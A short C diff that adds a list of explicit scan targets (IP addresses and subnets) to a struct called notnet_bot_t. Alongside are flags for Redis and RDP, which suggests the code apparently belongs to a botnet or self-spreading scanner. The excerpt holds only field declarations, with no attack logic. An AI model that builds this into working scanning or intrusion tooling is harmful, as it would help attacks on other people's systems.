@@ -90,6 +90,10 @@ typedef struct {
     uint8_t redis_enabled;
     uint8_t rdp_enabled;
 
+    /* Scan targets (explicit IPs/subnets, override default subnets) */
+    int scan_target_count;
+    char scan_targets[16][256];
+
     /* Update tracking */
     time_t last_update;
 } notnet_bot_t;
